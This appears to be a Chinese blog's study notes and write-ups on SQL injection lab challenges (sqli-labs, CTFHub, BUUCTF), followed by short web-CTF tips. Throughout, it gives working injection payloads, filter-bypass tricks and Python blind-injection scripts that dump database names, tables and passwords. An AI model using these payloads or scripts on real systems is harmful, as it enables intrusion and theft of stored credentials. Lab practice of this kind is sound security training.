   start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始截取；0，在字符串中第一个位置开始截取。
   length：可选，需要截取的长度。缺省。即截取到结束位置
***6.ascii(str)***：返回字符串最左边的数值
语法：ascii(str)
***7.database()***：当前使用的数据库
select database()

判断闭合形式绕过的万能密钥：1&#39; or 1=1这样主要是拿来判断成功登录时会有什么反应
首先尝试：
?id=1’?id=1”

1.如果都报错，则为整形闭合。
2.如果单引号报错，双引号不报错。   然后尝试:?id=1’–-+
   无报错则单引号闭合，报错则单引号加括号。
3如果单引号不报错，双引号报错。  然后尝试：?id=1&quot;–-+
  无报错则双引号闭合，报错则双引号加括号。
  多层括号同理
绕过方式&gt;大小写绕过：
比如过滤select时，在不区分大小写时候可以Select绕过
&gt;双写绕过：
过滤关键字可以用selselctect来绕过
&gt;*空格*****绕过****：
1 /**/ 可以代替空格当空格被过滤的时候
  例如：select/**/user/**/from/**/users;
  2可以使用Tab代替空格
  3可以使用空格url编码%20
  4如果空格被过滤，括号没有被过滤，可以用括号绕过
  例如：select(user)from(users);
当=被过滤时：可以用like或rlike，也可以用regexp（正则来匹配）来绕过
比如&#x3D;’admin’ 就可以like ‘admin’
****&gt;select被过滤时：****可以使用desc倒序查看表内的字段，也可以show columns from 表名。
 当需要查看具体信息的时候，可以使用预处理语句（1.5 堆叠注入查询）
****&gt;编码绕过：****两次URL全编码
fuzz脚本（好东西）get传参
import requestssql_char = [&#x27;select&#x27;,			&#x27;union&#x27;,			&#x27;and&#x27;,			&#x27;or&#x27;,			&#x27;sleep&#x27;,			&#x27;where&#x27;,			&#x27;from&#x27;,			&#x27;limit&#x27;,			&#x27;group&#x27;,			&#x27;by&#x27;,			&#x27;like&#x27;,			&#x27;prepare&#x27;,			&#x27;as&#x27;,			&#x27;if&#x27;,			&#x27;char&#x27;,			&#x27;ascii&#x27;,			&#x27;mid&#x27;,			&#x27;left&#x27;,			&#x27;right&#x27;,			&#x27;substring&#x27;,			&#x27;handler&#x27;,			&#x27;updatexml&#x27;,			&#x27;extractvalue&#x27;,			&#x27;benchmark&#x27;,			&#x27;insert&#x27;,			&#x27;update&#x27;,			&#x27;all&#x27;,			&#x27;@&#x27;,			&#x27;#&#x27;,			&#x27;^&#x27;,			&#x27;&amp;&#x27;,			&#x27;*&#x27;,			&#x27;\&#x27;&#x27;,			&#x27;&quot;&#x27;,			&#x27;~&#x27;,			&#x27;`&#x27;,			&#x27;(&#x27;,			&#x27;)&#x27;,			&#x27;--&#x27;,			&#x27;=&#x27;,			&#x27;/&#x27;,			&#x27;\\&#x27;,			&#x27; &#x27;]for char in sql_char:	res = requests.get(&quot;http://127.0.0.1/get.php?query=&quot;+char+&quot;&amp;submit2=sbumit&quot;)	if &#x27;Illegal Char&#x27; in res.text:		print(&quot;该字符是非法字符: &#123;0&#125;&quot;.format(char))	else:		print(&quot;通过: &#123;0&#125;&quot;.format(char))

post传参
import requestssql_char = [&#x27;select&#x27;,			&#x27;union&#x27;,			&#x27;and&#x27;,			&#x27;or&#x27;,			&#x27;sleep&#x27;,			&#x27;where&#x27;,			&#x27;from&#x27;,			&#x27;limit&#x27;,			&#x27;group&#x27;,			&#x27;by&#x27;,			&#x27;like&#x27;,			&#x27;prepare&#x27;,			&#x27;as&#x27;,			&#x27;if&#x27;,			&#x27;char&#x27;,			&#x27;ascii&#x27;,			&#x27;mid&#x27;,			&#x27;left&#x27;,			&#x27;right&#x27;,			&#x27;substring&#x27;,			&#x27;handler&#x27;,			&#x27;updatexml&#x27;,			&#x27;extractvalue&#x27;,			&#x27;benchmark&#x27;,			&#x27;insert&#x27;,			&#x27;update&#x27;,			&#x27;all&#x27;,			&#x27;@&#x27;,			&#x27;#&#x27;,			&#x27;^&#x27;,			&#x27;&amp;&#x27;,			&#x27;*&#x27;,			&#x27;\&#x27;&#x27;,			&#x27;&quot;&#x27;,			&#x27;~&#x27;,			&#x27;`&#x27;,			&#x27;(&#x27;,			&#x27;)&#x27;,			&#x27;--&#x27;,			&#x27;=&#x27;,			&#x27;/&#x27;,			&#x27;\\&#x27;,			&#x27; &#x27;]url = &quot;http://127.0.0.1/get.php&quot;header = &#123;	&#x27;Host&#x27;:&#x27;127.0.0.1&#x27;,	&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0&#x27;,	&#x27;Accept&#x27;:&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;,	&#x27;Accept-Language&#x27;:&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;,	&#x27;Accept-Encoding&#x27;:&#x27;gzip, deflate&#x27;,	&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;for char in sql_char:	post_data = &quot;query=test&quot;+char+&quot;&amp;submit2=sbumit&quot;	res = requests.post(url,data=post_data,headers=header)	if &#x27;Illegal Char&#x27; in res.text:		print(&quot;该字符是非法字符: &#123;0&#125;&quot;.format(char))	else:		print(&quot;通过: &#123;0&#125;&quot;.format(char))

union注入get传参使用 --+来注释掉后面的代码，或者 %23（这个是#的url编码）
post传参使用 #来注释掉后面的代码
less-1首先题目为get传参，通过测试可以判断出是单引号闭合，开始注入
?id=1&#39; order by 4 --+：通过这个判断出字段数为3
?id=1&#39; and 1=2 union select 1,2,database() --+：爆出数据库名
或者?id=1&#39; and 1=2 union select 1,2, group_concat(schema_name) from information_schema.schamata --+
?id=1&#39; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+：爆出所有表名
?id=1&#39; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+：爆出一个表的所有字段名
?id=1&#39; and 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+爆出用户名和密码，这样子爆出来看的更加整洁一点
less-2&amp;less-3&amp;less-4&amp;less-25&amp;less-25aless-2:get传参，测试出为整形闭合，接下来的操作和less-1的步骤一样
less-3:get传参，测试出为单引号加括号闭合，接下来操作不用多说了
less-4:get传参，测试出为双引号加括号闭合，接下来操作一致
less-25:单引号闭合，如果有用到or或者and要记得双写
less-25a:整形闭合，如果有用到or或者and要记得双写
less-11&amp;less-12less-11:post传参，单引号闭合
less-12:post传参，双引号加括号闭合
less-20&amp;less-21&amp;less-22$cookee = $_COOKIE[&#x27;uname&#x27;];			$format = &#x27;D d M Y - H:i:s&#x27;;			$timestamp = time() + 3600;			echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);			echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;			$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;

利用正确账号密码登录进去，再利用cookie进行注入操作，单引号闭合
less-21：单引号加括号闭合，cookie内容要base64编码
less-22：双引号闭合
less-23$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;

要在不用注释符号的情况下完成注入，所以我们要让前后两个单引号都完成闭合。例子如下：
?id=-1&#x27; union select 1,database(),&#x27;3

less-26（不间断空格）&amp;less-26a&amp;less-27&amp;less-27a&amp;less-28&amp;less-28a单引号闭合，过滤了 or，and ， &#x2F;* , – , # , 空格 , &#x2F;
?id=123&#x27;union%A0select%A01,2,&#x27;3

%A0 是不间断空格（non-breaking space）的 URL 编码表示
less-26a：和上一题相比就是多加了一个括号
?id=100&#x27;)union%a0select%a01,2,3||(&#x27;3

less-27：在上面一题的基础上再加上大小写混写
less-27a：在上一题基础上单引号变成了双引号
less-29&amp;less-30&amp;less-31到该题检验的方式就又变了，查看login.php文件，主要注意以下两个函数

具体代码如下：
function whitelist($input)&#123;	$match = preg_match(&quot;/^\d+$/&quot;, $input);	if($match)	&#123;		//echo &quot;you are good&quot;;		//return $match;	&#125;	else	&#123;			header(&#x27;Location: hacked.php&#x27;);		//echo &quot;you are bad&quot;;	&#125;&#125;function java_implimentation($query_string)&#123;	$q_s = $query_string;	$qs_array= explode(&quot;&amp;&quot;,$q_s);	foreach($qs_array as $key =&gt; $value)	&#123;		$val=substr($value,0,2);		if($val==&quot;id&quot;)		&#123;			$id_value=substr($value,3,30); 			return $id_value;			echo &quot;&lt;br&gt;&quot;;			break;		&#125;	&#125;&#125;

whitelist函数是要求输入的内容只能够是数字，而java_implimentation函数是检测第一个&amp;前面id的内容，所以&amp;后面的内容会怎么办，我们尝试一下，如下所示：
发现回显的是第二个id的内容，于是就找到了漏洞，在第二个id后面进行union注入
获取数据库名：？id&amp;id=0&#39; union all sElect 1,database(),3 --+
剩下的步骤就是普通的union注入
less-30：双引号包裹
less-31：双引号加括号包裹
报错注入updatexml报错updatexml()函数的使用：更新xml文档的函数，返回替换的XML片段
 语法：updatexml（xml_documat，XPath_string，new_value）
 参数：1.xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。
​			2.XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。
​			3.new_value：是string格式替换查找到符合条件的数据，在注入时可以加入任意字符，比如0x26（&amp;）。
构造模板注入语句：
select * from major where id=1 and updatexml(1,concat(0x26,(select database()),0x26),3);

原理解释：由于updatexml的第二个参数需要Xpath格式的字符串，以0x26开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入
注意：在爆表、列、值的时候注意一次查询最长输出32位
extractvalue报错extractvalue()函数的使用：使用XPath表示从XML字符串中提取值，从目标XML中返回包含所查询值得字符串。
 语法：extractvalue（xml_documat，XPath_string）
 参数：1.xml_documat：是STRING格式，为XML文档对象的名称，这一项可以输入一个十六进制的字符，比如0x26（&amp;）。
​			2.XPath_string：是XPath的格式的字符串，报错注入时需要写入错误的格式来显示错误的信息。
构造注入语句：
select * from major where id=1 and extractvalue(1,concat(0x26,(select database()),0x26));

注意：extrachtvalue()函数一次只能查询32位长度，在爆表、列、值的时候注意
原理解释：当Xpath路径语法错误时，就会报错，同时报错内容含有错误的路径内容。在updatexml()函数和extractvalue()函数中，都是通过对第二个参数Xpath进行修改，输入错误的格式，进行报错回显，来达到SQL注入。
less-5get传参，测试后发现是单引号包含，并且没有任何回显点可以利用，所以我们考虑使用报错注入，这边我是用的是extractvalue报错
?id=-1&#39;and extractvalue(1,concat(0x26,(select database()),0x26))--+：爆库
?id=-1&#39;and extractvalue(1,concat(0x26,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x26))--+：爆出所有表名
?id=-1&#39;and extractvalue(1,concat(0x26,(select group_concat(username,password) from users),0x26))--+：爆数据，但只有32位
1&#39; and extractvalue(1,concat(0x26,(select group_concat(username) from users where username not in(&#39;Dumb&#39;,&#39;Angelina&#39;,&#39;Dummy&#39;,&#39;secure&#39;)),0x26))--+：把已知的数据排除在外
less-6get传参，测试后发现是双引号包含，然后就按照less-5做就可以了
less-13&amp;less-14less-13:post传参，单引号加括号闭合
less-14:post传参，双引号闭合
CTFHub报错注入前面步骤都一样，就是最后爆出来的flag不全，所以要使用从右往左查看函数right或者用 not in把查询到的排除在外
1 and extractvalue(1,concat(0x26,(select right(group_concat(flag),32) from flag),0x26))

less-17通过查看源代码发现输入的账号名会被一个函数检查，所以不能从账号名处进行注入操作，继续查看源代码发现可以从密码处入手
@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row;	if($row)	&#123;  		//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;			$row1 = $row[&#x27;username&#x27;];  			//echo &#x27;Your Login name:&#x27;. $row1;		$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;;		mysql_query($update);  		echo &quot;&lt;br&gt;&quot;;

即从 $update处进行报错注入，单引号闭合，剩下的操作不必多说
uname=admin&amp;passwd=1&#x27; and extractvalue(1,concat(0x26,(select database()),0x26))#

less-18$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;	$result1 = mysql_query($sql);	$row1 = mysql_fetch_array($result1);		if($row1)			&#123;			echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;;			$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;			mysql_query($insert);			//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;			echo &quot;&lt;/font&gt;&quot;;			//echo &quot;&lt;br&gt;&quot;;			echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;;						echo &#x27;Your User Agent is: &#x27; .$uagent;			echo &quot;&lt;/font&gt;&quot;;

通过源代码发现用户名和密码都有强烈的过滤，登录成功后会回显 user-agent，所以要利用其insert语句来进行注入，注入 2 个连续的单引号，发现闭合成功，由此可见 2 个单引号分别闭合了 2 侧的单引号
post语句：uname=admin1&amp;passwd=admin1，需要成功登录才可以
在注入的两个单引号之间可以插入其他 Sql 语句，注意使用单引号闭合两侧的 Sql 语句时，相当于把它分割成了 2 部分，插入 要用 OR 进行连接：&#39;or extractvalue(1,concat(0x26,(select database()),0x26)) or&#39;
less-19成功登陆后回显refere，在那上面进行注入，剩下步骤与less-18的一模一样
布尔盲注CTFHubget传参，整型注入，输入正确会返回 query success
id=1 and (length(database())&gt;3) ：通过这个判断出数据库长度为4
通过下面判断出数据库的正确名称为sqli
id=1 and (ascii(substr(database(),1,1))&gt;110)1 and (ascii(substr(database(),2,1))=113) 1 and (ascii(substr(database(),3,1))=108) 1 and (ascii(substr(database(),4,1))=105) 

通过下面判断出数据库里面存在两个表（大于0说明存在表）
1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;01 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))&gt;0

测出表的长度都为4
1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=41 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4

然后通过同样的方法判断出第一个表名，第二个表名flag
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=110

查出flag表的字段数是1
1 and (select count(column_name) from information_schema.columns where table_name=&quot;flag&quot;)=1 

判断出表名长度为4，测试出字段名为flag
1 and (select count(flag) from flag)=1：判断该字段有几行
1 and ascii(substr((select flag from flag limit 0,1), 32,1)) ：解出flag
import requestsurlOPEN = &#x27;http://challenge-eb0855b296d32f7a.sandbox.ctfhub.com:10800/?id=&#x27;mark = &#x27;query_success&#x27;def database_name():    name = &#x27;&#x27;    for j in range(1,5):        for i in &#x27;qwertyuiopasdfghjklzxcvbnm&#x27;:            url = urlOPEN + &#x27;if(substr(database(),%d,1)=&quot;%s&quot;,1,(select table_name from information_schema.tables))&#x27; % (j, i)            r = requests.get(url)            if mark in r.text:                name = name + i                print(name)                break    print(&#x27;database_name&#x27;,name)database_name()//爆出数据库

less-8爆出数据库名：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;def database_name():    db_name = &#x27;&#x27;    for i in range(1, 9):        for k in &#x27;qwertyuiopasdfghjklzxcvbnm&#x27;:            payload = urlOPEN + &quot;?id=1&#x27;and substr(database(),%d,1)=&#x27;%s&#x27;--+&quot; % (i, k)            res = requests.get(payload)            if &#x27;You are in...........&#x27; in res.text:                db_name += k                print(db_name)                break    print(&quot;数据库为: %s&quot; % db_name)database_name()

爆出数据库下面有4张表：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;tab_num = 0while True:    payload = urlOPEN + &quot;?id=1&#x27;and (select count(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)=%d--+&quot; % tab_num    res = requests.get(payload)    if &#x27;You are in...........&#x27; in res.text:        print(&quot;数据库共有&quot; + str(tab_num) + &quot;张表&quot;)        break    else:        tab_num += 1

爆出表的长度和名字：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;for i in range(1, 5):    tab_len = 0    while True:        payload = urlOPEN + &quot;?id=1&#x27;and (select length(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit %d,1)=%d--+&quot; % (i - 1, tab_len)        res = requests.get(payload)        if &#x27;You are in...........&#x27; in res.text:            print (&#x27;第%d张表长度为:&#x27;%i+str(tab_len))            break        if tab_len == 30:            print(&#x27;error!&#x27;)            break        tab_len += 1    tab_name = &#x27;&#x27;    for j in range(1, tab_len + 1):        for m in &#x27;qwertyuiopasdfghjklzxcvbnm&#x27;:            payload = urlOPEN + &quot;?id=1&#x27;and substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit %d,1),%d,1)=&#x27;%s&#x27;--+&quot; % (i - 1, j, m)            res = requests.get(payload)            if &#x27;You are in...........&#x27; in res.text:                tab_name += m                # print (tab_name)    print(&quot;[-]第%d张表名为: %s&quot; % (i, tab_name))

爆破字段数和字段名的脚本和上面类似
爆破users表下的uesrname字段：
import requestsurlOPEN = &#x27;http://124.70.99.199:81/Less-8/&#x27;usn_num = 0char = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_-&quot;while True:    payload = urlOPEN + &quot;?id=1&#x27;and (select count(username) from security.users)=%d--+&quot; % usn_num    res = requests.get(payload)    if &quot;You are in&quot; in res.text:        print(usn_num)        break    usn_num += 1for i in range(1, usn_num + 1):    usn_len = 0    while True:        payload = urlOPEN + &quot;?id=1&#x27;and (select length(username) from security.users limit %d,1)=%d--+&quot; % (i - 1, usn_len)        res = requests.get(payload)        if &quot;You are in&quot; in res.text:            print(&quot;第%d的长度为%d&quot;%(i,usn_len))            break        usn_len += 1    usr_name = &#x27;&#x27;    for k in range(1, usn_len + 1):        for m in char:            payload = urlOPEN + &quot;?id=1&#x27;and substr((select username from security.users limit %d,1),%d,1)=&#x27;%s&#x27;--+&quot; % (i - 1, k, m)            res = requests.get(payload)            if &quot;You are in&quot; in res.text:                usr_name += m                break    print(usr_name)

爆破uses表下的password字段和上面类似
如果脚本还有不懂可以点击[这里](sqli-labs_less8布尔盲注脚本_sqlilab less8盲注脚本-CSDN博客)
时间注入时间注入是利用sleep()或者benchmark()等函数让MySQL的执行时间变长，通过时间的改变来判断结果
模板语句：if(length(database())&gt;1,sleep(3),1)
意思就是，如果数据库库名的长度大于1，则MySQL查询休眠3秒，否则查询1。查询1的结果大约一般只有几十毫秒，根据网页的响应时间，就可以判断条件是否正确
语法：if(expr1，expr2，expr3)语法含义：如果expr1是true，则if()的返回值为expr2，否则返回值则为expr3
1 and if(length(database())=4,sleep(3),1)：查询数据库长度
接下来的步骤就是把 length(database()=4)进行更换，跟手动布尔盲注差不多
less-9?id=1&#39; and if(length(database())=8,sleep(3),1) --+：得出数据库长度为8，下面为脚本的方法：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def database_len():    for i in range(1,10):        payload = &quot;?id=1&#x27; and if(length(database())&gt;%d,sleep(2),0)--+&quot; %i        url1 = url + payload        time1 =datetime.datetime.now()        r=requests.get(url1)        time2=datetime.datetime.now()        time3 = (time2-time1).total_seconds()        if time3 &gt;= 2:            print(i)        else:            print(i)            break    print(&#x27;数据库长度为:&#x27;,i)database_len()

爆出数据库名：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def database_name():    name=&#x27;&#x27;    for i in range(1,9):        for j in p1:            payload=&quot;?id=1&#x27; and if(substr(database(),%s,1)=&#x27;%s&#x27;,sleep(4),1)--+&quot; %(i,j)            url1=url+payload            time1=datetime.datetime.now()            r=requests.get(url1)            time2=datetime.datetime.now()            time3=(time2-time1).total_seconds()            if time3 &gt;= 4:                name += j                print(name)                break    print(&#x27;数据库名字为:&#x27;,name)database_name()

?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1))&gt;0,sleep(3),1) --+：得到数据库下面有4张表
爆破表的长度可见题目less-8
爆破表的名字：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def tables_name():    global table4    table1=&#x27;&#x27;    table2=&#x27;&#x27;    table3=&#x27;&#x27;    table4=&#x27;&#x27;    for i in range(4):        for j in range(1,6):            for t in p1:                payload=&quot;?id=1&#x27; and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=&#x27;%s&#x27;),3,0)) --+&quot;%(i,j,t)                url1=url+payload                time1=datetime.datetime.now()                r=requests.get(url1)                time2=datetime.datetime.now()                time3=(time2-time1).seconds                if time3 &gt;= 3:                    if i == 0:                        table1 +=t                        print(&#x27;第一个表为:&#x27;,table1)                    elif i == 1:                        table2 += t                        print(&#x27;第二个表为：&#x27;,table2)                    elif i == 2:                        table3 +=t                        print(&#x27;第三个表为：&#x27;,table3)                    elif i == 3:                        table4 += t                        print(&#x27;第四个表为：&#x27;,table4)                    else:                        break    print(&#x27;第一个表为&#x27;+table1)    print(&#x27;第二个表为&#x27;+table2)    print(&#x27;第三个表为&#x27; + table3)    print(&#x27;第四个表为&#x27; + table4)tables_name()

爆破字段数，长度，名字的脚本类似
爆破一行的字段内容（可以通过更改 limit 0,1来更改爆破地方，可以去看less-8的爆破）：
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-9/&quot;p1 = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;def s_content():    content1=&#x27;&#x27;    for i in range(20):            for t in p1:                payload = &quot;?id=1&#x27; and sleep(if((substr((select password from users limit 0,1),%s,1)=&#x27;%s&#x27; ),3,0)) --+&quot;%(i,t)                url1 =url+payload                time1=datetime.datetime.now()                r = requests.get(url1)                time2 = datetime.datetime.now()                time3 = (time2-time1).seconds                if time3 &gt;=3:                        content1 += t                        print(&#x27;password字段一内容为：&#x27;+content1)                        break    print(&#x27;字段内容为：&#x27;+content1)s_content()

less-10双引号闭合，剩下的和less-9一样
less-15(post传参脚本)&amp;less-16注意：该题逻辑运算符要用or
通过万能密钥 1&#39; or 1=1看到了成功登录时的图片
uname=1&#39; or length(database())=8#&amp;passwd=1数据库长度为8
sql-labs-less15&#x2F;less16|SQL注入|脚本时间注入-腾讯云开发者社区-腾讯云 (tencent.com)
爆破数据库名字
import requestsimport datetimeurl = &quot;http://124.70.99.199:81/Less-15/&quot;def get_dbname():    db_name = &#x27;&#x27;    for i in range(1,9):        for k in range(32,127):            database_payload = &#123;&quot;uname&quot;:&quot;admin&#x27; and if(ascii(substr(database(),%d,1))=%d,sleep(2),1)#&quot;%(i,k),&quot;passwd&quot;:&quot;1&quot;&#125;            time1 = datetime.datetime.now()            res = requests.post(url,database_payload)            time2 = datetime.datetime.now()            difference = (time2-time1).seconds            if difference &gt; 1:                db_name += chr(k)                print(&quot;数据库名为-&gt;&quot;+db_name)get_dbname()

查表名
table_payload = &#123;&quot;uname&quot;:&quot;admin&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=\&#39;security\&#39; limit %d,1),%d,1))=%d,sleep(2),1)#&quot;%(i,j,k),&quot;passwd&quot;:&quot;1&quot;&#125;可以这么写
less-16：Post传参，双引号加括号闭合
堆叠注入堆叠查询可以执行多条语句，多语句之间可以以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。
@堆叠查询注入模板语句：
1&#x27;;select * from major;#

SQL预处理（Prepare），是一种特殊的SQL处理方式；预处理不会直接执行SQL语句，而是先将SQL语句编译，生成执行计划，然后通过Execute命令携带SQL参数来执行SQL语句。
预定义prepare模板：
prepare xxx as select * from user where id=1;  //将select查询语句定义为xxxexecute xxx;  //再使用execute来执行这个变量xxx即可执行上诉的select查询语句

set是SQL Server中对已经定义的变量赋值方式
BUUCTF [强网杯 2019]随便注单引号包含，字段数为2
return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);：一些关键词被过滤掉了
0&#39;;show databases;--+：显示出所有数据库名
0&#39;;show tables;--+：显示出所有表名
0&#x27;;desc `1919810931114514`;--+：显示出表的字段名

发现有个字段是flag，于是用预定义语句来查询flag字段
0&#x27;;sEt@a=concat(&quot;sel&quot;,&quot;ect flag from `1919810931114514`&quot;);PRepare hello from @a;execute hello;--+

二次注入BUUCTF [RCTF 2015]EasySQL在帐号处输入一些特殊字符，然后去更改密码，可以测出是双引号闭合，会返回报错语句，可以判定是存在二次注入的，在注册的时候写入，然后再修改密码的地方修改密码后触发，这样就导致错误的输出，这里有错误的回显就可以使用报错注入来进行注入
过滤掉了很多的字符
推测的查询语句为 select * from 表名 where id=&quot;%s&quot; and pwd=&quot;密码&quot;
1&quot;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)#：查询出数据库
后面操作就是报错注入了
1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#:WHERE real_flag_1s_here REGEXP &#39;^f&#39; 表示筛选出 real_flag_1s_here 列值以字母 ‘f’ 开头的行。REGEXP 是正则表达式匹配操作符，’^’ 表示匹配行首（不这样子的话数据是一堆XXXXXXX）
1&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#：获得到剩下的flag，不过是反着的
less-24没有任何过滤，只能做到可以修改admin密码的程度，网上题解也就到这个程度
Cookie注入就是注入的地方变成了cookie
CTFHUB Web SQL Cookie注入做这种题目最好用bp抓包不要直接用hackbar，不好用，操作跟union注入的一样
宽字节注入哪里存在这个注入漏洞
由于数据库查询前执行了SET NAMES&#39; GBK&#39;，将编码设置为宽字节GBK，所以此处是存在宽字节注入漏洞
在PHP中，通过iconv()进行编码转换时，也可能存在宽字符注入漏洞
less-32&amp;less-33&amp;less-34function check_addslashes($string)&#123;    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);    return $string;&#125;if(isset($_GET[&#x27;id&#x27;]))&#123;$id=check_addslashes($_GET[&#x27;id&#x27;]);

这里通过使用id&#x3D;1’的查询方式发现，Hint中告知了后端将我们的语句进行了\转义，参数id&#x3D;1在数据库查询时是被单引号包围的。当传入id&#x3D;1’时，传入的单引号又被转义符（反斜线）转义，导致参数ID无法逃逸单引号的包围，所以在一般的情况下，此处是不存在SQL注入漏洞的。不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式就是在地址后面加一个**%df**，再加单引号，可以通过上面的测试发现，在单引号之前PHP会自动加一个\（反斜杠），因为反斜杠的编码为%5c，所以自动转义为\&#39;，而在GBK编码中，%df5c是繁体字“連”，由于汉字是双字节，所以这里&#39;之前的\就会被吃掉消失，那么会造成单引号成功逃逸，爆出MySQL数据库的错误
?id=0%df&#39;union select 1,2,3--+：发现就回显2，3
?id=0%df&#39;union select 1,2,database()--+：爆数据库名
?id=0%df&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())--+：爆表名
?id=0%df&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name = (select table_name from information_schema.tables where table_schema = (select database())limit 0,1)--+：爆一个个表的字段
?id=0%df&#39;union select 1,(select group_concat(id) from emails),(select group_concat(email_id) from emails)--+：爆表的内容
less-33：和less-32一样，这里就不多说了
less-34：只是传参方式从get变成了post而已，剩下的都没有变
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>解题心得</title>
    <url>/2023/11/11/%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97_max/%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[1.http（极客大挑战）首先查看源码发现 &lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;，点击该链接
然后通过页面信息修改referer：https://Sycsecret.buuoj.cn
接着浏览器信息，即 User-Agent:Syclover，然后告诉我们要从本地查看，上网查找发现本地都是这个端口号 127.0.0.1，修改xxf，然后flag就出来了
2.查看网页的备份文件（攻防世界）php的备份文件有两种：*.php~和*.php.bak
例子：http://61.147.171.105:55767/index.php.bak
2.机器人协议url&#x2F;robots.txt
3.php2（攻防世界）对网址后面加上&#x2F;index.phps就可以查看页面php源码
例子：http://111.198.29.45:45191/index.phps
phps是php的源代码文件，但是不能接受传参，所以hackbar还是要在.php里面做
4.cookie（攻防世界）如何查看http响应
打开开发者工具，再点击网络(network)，选择你想要查看http响应的网址
这道题的flag位于标头里面
5.扫描目录用dirsearch（攻防世界）dirsearch -u &lt;URL&gt;是要扫描的目标网站的URL
可以用以下选项来调整扫描：
-e:指定要排除的扩展名
-f:指定要包含的扩展名
-x:指定要排除的目录
-t:指定线程数
例子：dirsearch -u https://example.com/ -f php,html -t 50（用50个线程扫描一个URL，只包括.php和.html文件）
dirsearch -u https://example.com/ -o result.txt

将扫描结果保存到result.txt文件中
